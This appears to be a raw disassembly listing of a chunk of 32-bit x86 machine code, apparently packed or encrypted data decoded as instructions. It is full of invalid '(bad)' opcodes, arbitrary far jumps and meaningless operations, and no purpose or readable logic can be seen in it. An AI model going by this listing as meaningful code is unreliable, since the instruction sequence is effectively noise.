  416486:	loop   0x41641b
  416488:	sbb    esp,eax
  41648a:	dec    edx
  41648b:	(bad)  
  41648c:	jp     0x416438
  41648e:	fiadd  DWORD PTR ds:0x60c1ecb2
  416494:	add    BYTE PTR [ecx+0x6d],dl
  416497:	push   esp
  416498:	xchg   DWORD PTR [ecx],edi
  41649a:	sbb    DWORD PTR [edx+0x67],0x4b
  41649e:	inc    eax
  41649f:	mov    DWORD PTR [ecx],ecx
  4164a1:	xor    al,0x98
  4164a3:	int3   
  4164a4:	mov    dl,0x28
  4164a6:	stc    
  4164a7:	(bad)
  4164aa:	mov    bl,0x67
  4164ac:	nop
  4164ad:	aad    0xdf
  4164af:	push   0x28
  4164b1:	je     0x41649c
  4164b3:	mov    ch,0xc1
  4164b5:	jb     0x4164df
  4164b7:	icebp  
  4164b8:	jno    0x416457
  4164ba:	daa    
  4164bb:	xor    DWORD PTR [esi-0x78ee415f],esp
  4164c1:	and    bl,dl
  4164c3:	fcomp  DWORD PTR [ecx-0xe]
  4164c6:	jb     0x4164c3
  4164c8:	mov    al,0x9c
  4164ca:	int3   
  4164cb:	and    al,0x47
  4164cd:	cmp    ebx,DWORD PTR [ecx+0x650b9b68]
  4164d3:	mov    edx,0xbaf12044
  4164d8:	leave  
  4164d9:	jmp    0x9eb2:0x7ccf24cd
  4164e0:	adc    DWORD PTR [ecx],0x61
  4164e3:	(bad)  
  4164e4:	xchg   ecx,eax
  4164e5:	jecxz  0x41655b
  4164e7:	bound  edi,QWORD PTR [esi]
  4164e9:	sbb    al,0xcd
  4164eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164ec:	xor    esp,ebp
  4164ee:	sbb    eax,0xdc8d84d6
  4164f3:	inc    ecx
  4164f4:	adc    eax,0xb995549c
  4164f9:	shl    BYTE PTR [edx+0xa501bcb],1
  4164ff:	repz int3 
  416501:	es (bad) 
  416503:	push   ss
  416504:	popa   
  416505:	lahf   
  416506:	repz test al,0x70
  416509:	xchg   DWORD PTR [ecx+0x2f],ebx
  41650c:	pusha  
  41650d:	retf   0x1336
  416510:	cld    
  416511:	les    edx,FWORD PTR [ebx-0x18]
  416514:	mov    ah,0x49
  416516:	scas   eax,DWORD PTR es:[edi]
  416517:	sbb    BYTE PTR [esi-0xe840e6c],cl
  41651d:	std    
  41651e:	call   0xdea449d
  416523:	inc    eax
  416524:	inc    esp
  416525:	xor    ebp,eax
  416527:	aam    0x88
  416529:	in     eax,dx
  41652a:	scas   eax,DWORD PTR es:[edi]
  41652b:	push   ss
  41652c:	pop    ecx
  41652d:	repz repz ds clc 
  416531:	sub    esi,DWORD PTR [si+0xd]
  416535:	sar    DWORD PTR [edx+0x24],1
  416538:	fcomi  st,st(4)
  41653a:	repz clc 
  41653c:	push   0x94e25cd1
  416541:	xabort 0x61
  416544:	lods   eax,DWORD PTR ds:[esi]
  416545:	cli    
  416546:	jmp    0x51a1:0xbd539342
  41654d:	mov    cl,0x43
  41654f:	jmp    0xe9f5:0x558aa369
  416556:	push   edi
  416557:	jb     0x41656f
  416559:	jl     0x4165aa
  41655b:	frstor [edi]
  41655d:	jmp    0x2354f10b
  416562:	and    eax,0x2647277a
  416567:	mov    dl,0x2
  416569:	fisub  WORD PTR [edx]
  41656b:	test   DWORD PTR [eax-0x3f7e3af2],esi
  416571:	je     0x4165f1
  416573:	pop    esi
  416574:	cmp    BYTE PTR [ebx-0x79f6a604],bh
  41657a:	test   eax,0xeb920a85
  41657f:	jecxz  0x4165f4
  416581:	mov    bh,0x47
  416583:	jmp    0x4443169c
  416588:	out    0xf4,eax
  41658a:	repz cmp bh,BYTE PTR [esi]
  41658d:	dec    ecx
  41658e:	mov    edi,0x2dde7561
  416593:	sub    DWORD PTR [edx-0x6b],eax
  416596:	or     dh,cl
  416598:	ins    BYTE PTR es:[edi],dx
  416599:	data16 std 
  41659b:	inc    esi
  41659c:	outs   dx,DWORD PTR ds:[esi]
  41659d:	jge    0x416598
  41659f:	mov    ds:0x168e164a,al
  4165a4:	shr    DWORD PTR [edi],1
  4165a6:	ja     0x416573
  4165a8:	inc    esi
  4165a9:	cld    
  4165aa:	loopne 0x41662b
  4165ac:	shl    bl,0xb8
  4165af:	cmp    al,0xf2
  4165b1:	leave  
  4165b2:	jae    0x416604
  4165b4:	lahf   
  4165b5:	inc    edi
  4165b6:	add    al,0x6a
  4165b8:	rcl    DWORD PTR [edx],0x3e
  4165bb:	mov    bh,0x0
  4165bd:	sbb    DWORD PTR [ecx],0x146ac509
  4165c3:	icebp  
  4165c4:	and    DWORD PTR [ebp-0x11532d8f],esi
  4165ca:	imul   ecx,DWORD PTR [ebx-0x5],0xe9a6a9e2
  4165d1:	or     BYTE PTR ds:0x914e1596,ch
  4165d7:	lahf   
  4165d8:	jnp    0x4165f7
  4165da:	jno    0x416596
  4165dc:	pop    ebx
  4165dd:	imul   esi,ebx,0x9de33767
  4165e3:	neg    BYTE PTR [ebp+0x47]
  4165e6:	hlt    
  4165e7:	stos   BYTE PTR es:[edi],al
  4165e8:	bound  ebp,QWORD PTR [eax-0x18]
  4165eb:	jno    0x4165ef
  4165ed:	xor    ebp,DWORD PTR [ecx+0x5bf423a0]
  4165f3:	int3   
  4165f4:	(bad)  
  4165f5:	outs   dx,BYTE PTR ds:[esi]
  4165f6:	fsubr  DWORD PTR [esi+0x4]
  4165f9:	sbb    eax,0x5fac0dda
  4165fe:	test   BYTE PTR [esi-0x4],al
  416601:	mov    edi,0x7f1fca1e
  416606:	adc    BYTE PTR [ebx+0x66],0x3b
  41660a:	sub    al,0xfb
  41660c:	sub    eax,0x89bb62a2
  416611:	push   edi
  416612:	inc    eax
  416613:	ins    BYTE PTR es:[edi],dx
  416614:	push   edi
  416615:	cli    
  416616:	mov    ds:0xfea737ef,eax
  41661b:	imul   eax,DWORD PTR [ebx],0x5105f096
  416621:	imul   ecx,DWORD PTR [esi],0xf304a28f
  416627:	xchg   ebx,eax
  416628:	mov    ecx,0x713eabbb
  41662d:	test   al,0x85
  41662f:	addr16 aas 
  416631:	and    eax,edi
  416633:	dec    esi
  416634:	xor    eax,0x748a81c3
  416639:	les    esi,FWORD PTR [esi+edi*4-0x45]
  41663d:	test   al,0x86
  41663f:	add    DWORD PTR [ebx+0x61],esi
  416642:	dec    DWORD PTR [eax-0xb]
  416645:	pop    ebx
  416646:	cli    
  416647:	fnstenv [ecx]
  416649:	lods   al,BYTE PTR ds:[esi]
  41664a:	aas    
  41664b:	jae    0x416619
  41664d:	cmp    eax,0xf6cb3a16
  416652:	ds jmp 0x416645
  416655:	dec    ebx
  416656:	sub    DWORD PTR [edx-0x6],edx
  416659:	jmp    0x82677df3
  41665e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41665f:	or     BYTE PTR [eax+0x58e84d23],cl
  416665:	cmp    ecx,edx
  416667:	add    eax,DWORD PTR [ebx]
  416669:	scas   eax,DWORD PTR es:[edi]
  41666a:	sub    BYTE PTR [ecx],dl
  41666c:	retf   0xa0cc
  41666f:	mov    al,ds:0xdd03aa4c
  416674:	adc    DWORD PTR [esi+edi*2],0xf197090f
  41667b:	or     BYTE PTR [edx+0x30ecbeac],dl
  416681:	jecxz  0x416684
  416683:	repnz or BYTE PTR [ebp+0x3f3b55a3],ah
  41668a:	adc    BYTE PTR [ebx-0x36a62e48],ah
  416690:	xor    al,0x44
  416693:	jno    0x41670a
  416695:	pushf  
  416696:	cmp    ch,bh
  416698:	sbb    ebx,esi
  41669a:	mov    eax,0x4f89d235
  41669f:	mov    dl,0xa2
  4166a1:	cdq    
  4166a2:	gs out dx,eax
  4166a4:	clc    
  4166a5:	ins    BYTE PTR es:[edi],dx
  4166a6:	into   
  4166a7:	(bad)  
  4166a8:	test   eax,0x1c4a1dd1
  4166ad:	xor    al,0xc3
  4166af:	test   al,0x71
  4166b1:	adc    ebx,DWORD PTR [ebp+0x74a4e639]
  4166b7:	or     cl,BYTE PTR [eax+0x50]
  4166ba:	mov    bl,0x69
  4166bc:	pop    ebx
  4166bd:	das    
  4166be:	xchg   edi,eax
  4166bf:	cdq    
  4166c0:	ror    BYTE PTR [ebx-0x72],0x85
  4166c4:	jnp    0x4166fd
  4166c6:	ds jns 0x416666
  4166c9:	mov    ds:0xa3fce3fa,al
  4166ce:	out    0xdf,eax
  4166d0:	stc    
  4166d1:	and    cl,BYTE PTR [ebx]
  4166d3:	and    DWORD PTR [edx-0x6c],0xffffffda
  4166d7:	in     eax,dx
  4166d8:	aaa    
  4166d9:	(bad)  
  4166da:	out    dx,al
  4166db:	xchg   esp,eax
  4166dc:	jecxz  0x4166a7
  4166de:	das    
  4166df:	mov    ebx,0xe0f5522c
  4166e4:	xchg   esp,eax
  4166e5:	hlt    
  4166e6:	jne    0x416702
  4166e8:	mov    ebp,0xc82c9780
  4166ed:	(bad)  
  4166ef:	stos   DWORD PTR es:[edi],eax
  4166f0:	shl    bh,1
  4166f2:	mov    cl,0xf5
  4166f4:	lods   al,BYTE PTR ds:[esi]
  4166f5:	push   edi
  4166f6:	cdq    
  4166f7:	add    bh,BYTE PTR [edx-0x6ae1bfd0]
  4166fd:	pop    edi
  4166fe:	and    esp,esi
  416700:	push   0x88e2d868
  416705:	cmp    DWORD PTR [esi+0x33c156e9],esp
  41670b:	sub    ch,BYTE PTR [eax+0x56]
  41670e:	and    DWORD PTR [ebp+0x7e],0x13434618
  416715:	add    ah,BYTE PTR [ebx-0x17]
  416718:	xchg   edx,eax
  416719:	xchg   esi,eax
  41671a:	or     edi,0x7564795c
  416720:	adc    al,0x53
  416722:	dec    ebp
  416723:	inc    ecx
  416724:	ins    DWORD PTR es:[edi],dx
  416725:	add    al,BYTE PTR [ebx+0x24b2fec5]
  41672b:	mov    cl,0xcf
  41672d:	ja     0x416746
  41672f:	call   0x79e:0x73f06e7a
  416736:	ds out 0xd3,al
  416739:	nop
  41673a:	(bad)  
  41673b:	shl    DWORD PTR [eax+0x79981b3e],cl
  416741:	add    eax,0xc243a5db
  416746:	sub    BYTE PTR [ecx+ecx*8],bh
  416749:	ins    BYTE PTR es:[edi],dx
  41674a:	mov    dl,0x21
  41674c:	cwde   
  41674d:	rcl    DWORD PTR [ebx-0x667d77b8],1
  416753:	sahf   
  416754:	push   cs
  416755:	fstp   TBYTE PTR [esi]
  416757:	pop    edi
  416758:	(bad)  
  416759:	aad    0x26
  41675b:	xor    esp,edi
  41675d:	aam    0x3a
  41675f:	enter  0xb60c,0x6d
  416763:	mov    ds,WORD PTR [ecx+0x52]
  416766:	mov    esp,0x86a6fd32
  41676b:	fiadd  DWORD PTR [ebp+0x43]
  41676e:	lahf   
  41676f:	jbe    0x4166ff
  416771:	adc    dh,BYTE PTR [ebx+0x4989f79b]
  416777:	scas   eax,DWORD PTR es:[edi]
  416778:	mov    al,ds:0x3913e03f
  41677d:	jmp    0x416702
  41677f:	ds push 0xffffff99
  416782:	add    esi,ecx
  416784:	dec    esp
  416785:	sub    al,ah
  416787:	pop    es
  416788:	jbe    0x4167f8
  41678a:	popa   
  41678b:	dec    ebp
  41678c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41678d:	adc    ecx,DWORD PTR [ebp+edi*8-0x11c870e4]
  416794:	adc    al,0x6c
  416796:	ret    0x4a38
  416799:	push   cs
  41679a:	paddq  mm5,QWORD PTR [esi]
  41679d:	sub    al,0x6a
  41679f:	ja     0x41675d
  4167a1:	push   esi
  4167a2:	jl     0x416774
  4167a4:	inc    esi
  4167a5:	pushf  
  4167a6:	jl     0x416742
  4167a8:	ins    BYTE PTR es:[edi],dx
  4167a9:	add    ebp,DWORD PTR [edi+0x62]
  4167ac:	or     cl,BYTE PTR [ebx-0x2f]
  4167af:	lea    eax,[ebp+ecx*8-0x35]
  4167b3:	dec    ebx
  4167b4:	stc    
  4167b5:	push   cs
  4167b6:	sbb    eax,0x6d69395d
  4167bb:	and    DWORD PTR [edx],eax
  4167bd:	cmp    ebx,esp
  4167bf:	jns    0x4167bc
  4167c1:	dec    ax
  4167c3:	ss push eax
  4167c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167c6:	jmp    0x416821
  4167c8:	pop    esi
  4167c9:	std    
  4167ca:	stc    
  4167cb:	arpl   WORD PTR [esi],di
  4167cd:	cmp    ebp,DWORD PTR [esi-0x68]
  4167d0:	mov    edi,0x51d266c6
  4167d5:	jnp    0x41677d
  4167d7:	gs mov esi,0xe1eba807
  4167dd:	and    ecx,0xdfeb0d08
  4167e3:	dec    ebp
  4167e4:	stc    
  4167e5:	out    dx,eax
  4167e6:	popf   
  4167e7:	or     al,0xc0
  4167e9:	xor    eax,0x981ed12b
  4167ee:	mov    dl,0x25
  4167f0:	adc    eax,DWORD PTR [edx+0x6e]
  4167f3:	cmp    ecx,DWORD PTR [si-0x36]
  4167f7:	push   0xffffff8f
  4167f9:	sbb    eax,0xca5b3b33
  4167fe:	mov    al,0x8e
  416800:	fs xchg esp,eax
  416802:	inc    ebp
  416803:	(bad)  
  416804:	fcomp  QWORD PTR [edx-0x64af1a8a]
  41680a:	xor    DWORD PTR [ebp+eax*2-0x6c],edx
  41680e:	(bad)  
  41680f:	xor    cl,BYTE PTR [ebp+0x74]
  416812:	mov    ss,WORD PTR [ebp+0x22264b01]
  416818:	daa    
  416819:	pop    ds
  41681a:	cs inc edi
  41681c:	sbb    DWORD PTR [ecx],esp
  41681e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41681f:	dec    ecx
  416820:	enter  0x7f15,0x63
  416824:	dec    ebp
  416825:	push   ds
  416826:	sub    al,BYTE PTR [esi]
  416828:	jbe    0x41682b
  41682a:	das    
  41682b:	clc    
  41682c:	inc    esi
  41682d:	xor    DWORD PTR [edi-0x5f],0xd5853509
  416834:	sbb    ah,BYTE PTR [edi]
  416836:	push   cs
  416837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416838:	loopne 0x4167c2
  41683a:	or     eax,DWORD PTR [eax+0x66]
  41683d:	fxch   st(5)
  41683f:	fcmovnb st,st(4)
  416841:	shr    BYTE PTR [ebx],cl
  416843:	inc    esp
  416844:	push   ebx
  416845:	adc    bl,BYTE PTR [esi+ecx*2-0x49e237c2]
  41684c:	ins    DWORD PTR es:[edi],dx
  41684d:	xchg   edi,eax
  41684e:	sub    ecx,DWORD PTR [esi]
  416850:	das    
  416851:	dec    ebp
  416852:	rcr    DWORD PTR [ebx],cl
  416854:	and    eax,0x2df6efbb
  416859:	dec    ecx
  41685a:	push   ecx
  41685b:	sbb    edx,DWORD PTR [ecx-0x40a65fcc]
  416861:	jge    0x416848
  416863:	dec    edx
  416864:	cmpxchg ah,dh
  416867:	rcl    BYTE PTR [edx-0x60ab55fa],cl
  41686d:	call   0x22ea:0xcfc180fa
  416874:	inc    ecx
  416875:	jp     0x416862
  416877:	dec    ebx
  416878:	test   eax,0xcb1d6b45
  41687d:	mov    bl,0xf2
  41687f:	and    al,0x7e
  416881:	cmp    al,0xd4
  416883:	dec    ecx
  416884:	clc    
  416885:	and    eax,0x30b7a518
  41688a:	push   0xffffff93
  41688c:	inc    eax
  41688d:	pop    ds
  41688e:	inc    edi
  41688f:	or     BYTE PTR [eax-0x15],bl
  416892:	dec    edi
  416893:	mov    ds:0x9692871c,eax
  416898:	xchg   esp,eax
  416899:	pop    edi
  41689a:	mov    dh,0x39
  41689c:	lods   al,BYTE PTR ds:[esi]
  41689d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41689e:	cmc    
  41689f:	into   
  4168a0:	inc    edi
  4168a1:	fdivr  DWORD PTR ds:0x98972115
  4168a7:	imul   ecx,DWORD PTR [esi+esi*8-0x7ecc3b89],0x5c0c97a3
  4168b2:	pop    ebp
  4168b3:	adc    ebx,DWORD PTR [ebx+ebp*8]
  4168b6:	sbb    DWORD PTR [eax],0x3b
  4168b9:	mov    WORD PTR [ecx-0x25771c3f],cs
  4168bf:	(bad)  
  4168c0:	fimul  DWORD PTR [esp+ecx*2]
  4168c3:	inc    edi
  4168c4:	cmp    cl,BYTE PTR ds:0x491c67db
  4168ca:	outs   dx,DWORD PTR ds:[esi]
  4168cb:	xchg   DWORD PTR [edx-0x497fad3e],edx
  4168d1:	gs scas al,BYTE PTR es:[edi]
  4168d3:	popa   
  4168d4:	mov    edx,0x54679c82
  4168d9:	xchg   ecx,eax
  4168da:	daa    
  4168db:	push   cs
  4168dc:	popa   
  4168dd:	cmp    esi,DWORD PTR [ecx-0x5dd5f1c7]
  4168e3:	and    edi,0xffffff90
  4168e6:	and    esi,DWORD PTR [eax]
  4168e8:	and    bl,BYTE PTR [ebx]
  4168ea:	or     edx,0xffffffa7
  4168ed:	stos   DWORD PTR es:[edi],eax
  4168ee:	push   esp
  4168ef:	push   edi
  4168f0:	not    DWORD PTR [edi+0x4e2eabb9]
  4168f6:	adc    al,0x66
  4168f8:	dec    esi
  4168f9:	sbb    BYTE PTR [ebx-0x7a022440],bl
  4168ff:	xor    DWORD PTR [ebx+0x69d16c0],esi
  416905:	repz faddp st(1),st
  416908:	test   DWORD PTR [ecx+0x447b4d43],ebx
  41690e:	pop    ebp
  41690f:	fisubr WORD PTR [edx-0x77]
  416912:	(bad)  
  416914:	and    BYTE PTR [edx+eiz*8-0x5c],ah
  416918:	dec    edi
  416919:	mov    cs,WORD PTR [edx-0x13]
  41691c:	xchg   esp,eax
  41691d:	(bad)  
  41691e:	cmp    ch,BYTE PTR [eax]
  416920:	cli    
  416921:	(bad)  
  416922:	jg     0x41697d
  416924:	mov    bh,BYTE PTR [esi+0x4af487a5]
  41692a:	push   ecx
  41692b:	add    eax,0xfab220ea
  416930:	mov    esp,0x884f6442
  416935:	cld    
  416936:	aam    0xb9
  416938:	xchg   esp,eax
  416939:	or     BYTE PTR [ecx-0x5fb5ab86],cl
  41693f:	arpl   WORD PTR [ebx+0x6b7d90e1],ax
  416945:	ja     0x4168e1
  416947:	lods   eax,DWORD PTR ds:[esi]
  416948:	pop    ss
  416949:	js     0x41690c
  41694b:	mov    al,ds:0x436e574
  416950:	pop    ebx
  416951:	push   edi
  416952:	test   BYTE PTR [eax-0x7f],bh
  416955:	repz xlat BYTE PTR ds:[ebx]
  416957:	outs   dx,BYTE PTR ds:[esi]
  416958:	xchg   esi,eax
  416959:	jne    0x4169ba
  41695b:	fsub   QWORD PTR [edx-0x61]
  41695e:	pusha  
  41695f:	add    dl,BYTE PTR [esi-0x302552fb]
  416965:	add    dh,bh
  416967:	or     cl,bh
  416969:	jmp    0x54ad:0x1db1a222
  416970:	push   ebx
  416971:	pop    esp
  416972:	xchg   esp,eax
  416973:	jne    0x4169ee
  416975:	pop    esi
  416976:	sub    eax,0x4791333a
  41697b:	into   
  41697c:	lahf   
  41697d:	mov    ecx,0x6a524d15
  416982:	xor    ebp,eax
  416984:	test   al,0x4f
  416986:	mov    DWORD PTR [ebp-0x3cfd92e6],esi
  41698c:	aaa    
  41698d:	scas   eax,DWORD PTR es:[edi]
  41698e:	sbb    BYTE PTR [eax-0x54303d26],dh
  416994:	cmp    eax,edi
  416996:	jne    0x416998
  416998:	adc    eax,DWORD PTR [ecx-0x2f]
  41699b:	pusha  
  41699c:	xchg   ecx,eax
  41699d:	xor    eax,0xffffffb6
  4169a0:	pop    eax
  4169a1:	dec    edi
  4169a2:	repnz dec eax
  4169a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169a5:	loope  0x41693b
  4169a7:	scas   eax,DWORD PTR es:[edi]
  4169a8:	inc    edi
  4169a9:	ds fwait
  4169ab:	fwait
  4169ac:	loope  0x416959
  4169ae:	pop    edx
  4169af:	(bad)  
  4169b0:	jmp    0x416a21
  4169b2:	clc    
  4169b3:	mov    WORD PTR ss:[ebx],gs
  4169b6:	and    ebp,DWORD PTR [eax+0x62]
  4169b9:	shr    DWORD PTR [edi-0xf],0x76
  4169bd:	cmp    eax,DWORD PTR [ebp+eiz*1-0x30]
  4169c1:	out    dx,al
  4169c2:	test   edx,eax
  4169c4:	pop    esi
  4169c5:	sbb    DWORD PTR [ebp+edi*2-0x38],ebp
  4169c9:	mov    eax,ds:0x355be103
  4169ce:	clc    
  4169cf:	ret    0x8c4d
  4169d2:	pushf  
  4169d3:	jnp    0x416996
  4169d5:	xor    bh,BYTE PTR [ebp-0x1d]
  4169d8:	sbb    eax,0xaeec0888
  4169dd:	shl    DWORD PTR [eax],0x5e
  4169e0:	(bad)  
  4169e1:	xchg   esi,eax
  4169e2:	push   edi
  4169e3:	enter  0x5a8d,0xee
  4169e7:	adc    eax,0x52c0123f
  4169ec:	dec    ecx
  4169ed:	sub    BYTE PTR [edi-0x5e72ad54],al
  4169f3:	cli    
  4169f4:	ja     0x416a60
  4169f6:	ss xor eax,0x58651c0c
  4169fc:	stos   DWORD PTR es:[edi],eax
  4169fd:	pop    ebp
  4169fe:	stos   DWORD PTR es:[edi],eax
  4169ff:	(bad)  
  416a00:	cdq    
  416a01:	aas    
  416a02:	add    BYTE PTR [eax],ch
  416a04:	sbb    DWORD PTR [edx],esp
  416a06:	jno    0x416a3c
  416a08:	clc    
  416a09:	std    
  416a0a:	mov    bh,0xdf
  416a0c:	aaa    
  416a0d:	cmp    BYTE PTR [ebp+0x5c31f665],bl
  416a13:	jmp    0x416a30
  416a15:	repnz sub bh,BYTE PTR [edi-0x37]
  416a19:	les    ebx,FWORD PTR [ebx+ebx*2]
  416a1c:	xor    bh,BYTE PTR [esi+0x4a2b4030]
  416a22:	gs cmc 
  416a24:	push   es
  416a25:	pop    ebx
  416a26:	div    DWORD PTR [esi+0x6b]
  416a29:	pop    ecx
  416a2a:	sbb    al,0x2a
  416a2c:	call   0x2934:0xcea66af0
  416a33:	inc    ebp
  416a34:	add    eax,0x755dfd09
  416a39:	js     0x416a38
  416a3b:	or     ebp,ebx
  416a3d:	test   cl,bl
  416a3f:	sti    
  416a40:	fcomp  QWORD PTR [ecx]
  416a42:	test   al,0x8b
  416a44:	cmp    dl,BYTE PTR [eax+0x66]
  416a47:	imul   esp,DWORD PTR es:[ebp+0x6b58e907],0xb36980c1
  416a52:	and    DWORD PTR [eax-0x966c5df],0x47d4a1ab
  416a5c:	sub    eax,0xef6f173b
  416a61:	push   0x4ff993de
  416a66:	pop    ebx
  416a67:	xchg   ecx,eax
  416a68:	pop    ds
  416a69:	mov    bl,0x9
  416a6b:	(bad)  
  416a6c:	adc    dh,BYTE PTR [edx+0x46cf81c9]
  416a72:	inc    edi
  416a73:	jge    0x4169fc
  416a75:	dec    edi
  416a76:	sahf   
  416a77:	jg     0x416a65
  416a79:	xchg   ecx,eax
  416a7a:	jmp    0x5621a2d7
  416a7f:	mov    ebp,DWORD PTR [esi+0x15b4f9be]
  416a85:	mov    ch,0x2f
  416a87:	jecxz  0x416a40
  416a89:	xchg   esi,eax
  416a8a:	stos   DWORD PTR es:[edi],eax
  416a8b:	mov    gs,WORD PTR [edi-0x4f]
  416a8e:	cmp    ecx,DWORD PTR [edx-0x51b4b6f8]
  416a94:	jno    0x416aec
  416a96:	inc    ecx
  416a97:	adc    eax,0x58e998fc
  416a9c:	retf   
  416a9d:	pop    edx
  416a9e:	mov    edi,0x16e4ab63
  416aa3:	jecxz  0x416a40
  416aa5:	scas   eax,DWORD PTR es:[edi]
  416aa6:	test   eax,0x382dedb7
  416aab:	daa    
  416aac:	jne    0x416b29
  416aae:	cwde   
  416aaf:	pop    ds
  416ab0:	jle    0x416a68
  416ab2:	dec    ebx
  416ab3:	fisttp DWORD PTR [edx+0x50bae4ce]
  416ab9:	imul   BYTE PTR [edi]
  416abb:	xchg   ecx,eax
  416abc:	test   eax,0xcd7a3a15
  416ac1:	out    0x40,eax
  416ac3:	xchg   edx,eax
  416ac4:	push   ds
  416ac5:	daa    
  416ac6:	repz clc 
  416ac8:	or     al,0xc0
  416aca:	adc    al,0x3d
  416acc:	sub    bh,BYTE PTR [edi-0x7]
  416acf:	lods   eax,DWORD PTR ds:[esi]
  416ad0:	and    BYTE PTR [esi-0x50119b5e],bh
  416ad6:	adc    ebp,ebx
  416ad8:	mov    dh,BYTE PTR [edi-0x2a]
  416adb:	pop    edi
  416adc:	jo     0x416af7
  416ade:	jmp    0x390499ea
  416ae3:	push   0xfffffff2
  416ae5:	xchg   esp,eax
  416ae6:	and    bl,BYTE PTR [ecx-0x38b940ce]
  416aec:	sub    cl,BYTE PTR [edi-0x42e40e3e]
  416af2:	aas    
  416af3:	imul   ebx,DWORD PTR [ecx+0x67],0x4ce93418
  416afa:	jp     0x416b4e
  416afc:	mov    edx,edx
  416afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aff:	lods   eax,DWORD PTR ds:[esi]
  416b00:	push   esi
  416b01:	mov    dl,0xc8
  416b03:	xchg   ebp,eax
  416b04:	cwde   
  416b05:	push   eax
  416b06:	sub    ebx,DWORD PTR [ebp+0x639cc78e]
  416b0c:	adc    DWORD PTR [esi+0x4f],esi
  416b0f:	popf   
  416b10:	out    dx,al
  416b11:	in     al,dx
  416b12:	sub    al,0x60
  416b14:	lea    esp,[edi-0x2b3fe6fc]
  416b1a:	dec    edi
  416b1b:	scas   eax,DWORD PTR es:[edi]
  416b1c:	xchg   ebp,eax
  416b1d:	(bad)  
  416b1e:	mov    WORD PTR [ebp+eiz*2-0x3847c52],di
  416b26:	nop
  416b27:	outs   dx,DWORD PTR ds:[esi]
  416b28:	xchg   ch,dl
  416b2a:	xchg   ecx,eax
  416b2b:	pop    ds
  416b2c:	dec    eax
  416b2d:	int3   
  416b2e:	mov    ch,ch
  416b30:	pop    ebp
  416b31:	jg     0x416b09
  416b33:	stc    
  416b34:	lds    edx,FWORD PTR [ecx+0x34]
  416b37:	lods   al,BYTE PTR ds:[esi]
  416b38:	sub    al,0x34
  416b3a:	sbb    eax,0x5847162d
  416b3f:	mov    esi,0x3d51ff66
  416b44:	psubd  mm7,QWORD PTR [ecx-0x14b71fe7]
  416b4b:	lock inc esp
  416b4d:	std    
  416b4e:	inc    ebx
  416b4f:	dec    esp
  416b50:	les    ebx,FWORD PTR [edx+0x5fc6ebb7]
  416b56:	je     0x416ae8
  416b58:	adc    DWORD PTR [edi],edx
  416b5a:	dec    edi
  416b5b:	imul   DWORD PTR [eax-0x4e6af4f9]
  416b61:	pop    esi
  416b62:	xchg   edi,eax
  416b63:	mov    ah,0x6f
  416b65:	add    BYTE PTR [esp+eax*1-0x36d6fe24],cl
  416b6c:	mov    cl,0x58
  416b6e:	push   esp
  416b6f:	and    ch,BYTE PTR [esi+0x22]
  416b72:	sbb    al,0xe0
  416b74:	push   0xe37ba2c6
  416b79:	outs   dx,BYTE PTR ds:[esi]
  416b7a:	daa    
  416b7b:	jle    0x416b3b
  416b7d:	xchg   ebx,eax
  416b7e:	lods   eax,DWORD PTR ds:[esi]
  416b7f:	jbe    0x416ba6
  416b81:	adc    bh,BYTE PTR [edi-0x7a]
  416b84:	rcr    DWORD PTR [esi-0x43d01e31],0x2e
  416b8b:	mov    WORD PTR [edx-0x682fc913],ds
  416b91:	nop
  416b92:	jb     0x416b55
  416b94:	jg     0x416bc0
  416b96:	add    BYTE PTR [esp+edx*8+0x7156db91],cl
  416b9d:	inc    sp
  416b9f:	inc    esp
  416ba0:	movups xmm3,XMMWORD PTR [edi-0x5]
  416ba4:	and    DWORD PTR [edx+0x39572d9c],eax
  416baa:	jnp    0x416bb4
  416bac:	mov    eax,ds:0xbdd903e2
  416bb1:	and    BYTE PTR [ebp+0x44],cl
  416bb4:	cmp    bh,dl
  416bb6:	or     al,0xe5
  416bb8:	sahf   
  416bb9:	xchg   esi,eax
  416bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bbb:	rcl    DWORD PTR [edi-0x71433ec0],0xea
  416bc2:	pop    ebp
  416bc3:	xor    esp,DWORD PTR [ebx-0x1c]
  416bc6:	hlt    
  416bc7:	mov    ds:0x5a1835d3,eax
  416bcc:	sbb    DWORD PTR [edi],eax
  416bce:	or     BYTE PTR [ebx],ah
  416bd0:	push   ebx
  416bd1:	or     BYTE PTR [eax-0x55],cl
  416bd4:	nop
  416bd5:	pop    esp
  416bd6:	mov    ah,BYTE PTR [eax-0x7d64dd7]
  416bdc:	mov    ds:0xba63eab9,eax
  416be1:	inc    esi
  416be2:	add    al,0xb6
  416be4:	das    
  416be5:	xchg   esp,eax
  416be6:	jnp    0x416b87
  416be8:	xor    al,0x93
  416bea:	and    eax,0xc1c10607
  416bef:	setbe  BYTE PTR [ebp-0x42]
  416bf3:	loopne 0x416c0d
  416bf5:	ret    
  416bf6:	aas    
  416bf7:	faddp  st(0),st
  416bf9:	mov    esi,0x479ebbb
  416bfe:	fild   DWORD PTR [ebx-0x51]
  416c01:	pop    ebx
  416c02:	mov    al,ds:0x72441809
  416c07:	inc    edx
  416c08:	pusha  
  416c09:	push   edx
  416c0a:	pop    es
  416c0b:	bound  esi,QWORD PTR ds:0x3b4a44bc
  416c11:	xchg   esp,eax
  416c12:	push   cs
  416c13:	test   BYTE PTR [ebx],cl
  416c15:	mov    ecx,0x3cf3a1b4
  416c1a:	fistp  QWORD PTR [edx+edx*2-0x7d99ad0c]
  416c21:	retf   0x399d
  416c24:	inc    esp
  416c25:	outs   dx,BYTE PTR ds:[esi]
  416c26:	cli    
  416c27:	jno    0x416c32
  416c29:	xlat   BYTE PTR ds:[ebx]
  416c2a:	push   esp
  416c2b:	aad    0x59
  416c2d:	fisub  WORD PTR [esi-0x3c81f43d]
  416c33:	ss jg  0x416c4d
  416c36:	enter  0xc05d,0x1b
  416c3a:	dec    esp
  416c3b:	mov    dh,0x66
  416c3d:	imul   ebx,DWORD PTR [edi+0x3e],0xffffffea
  416c41:	push   cs
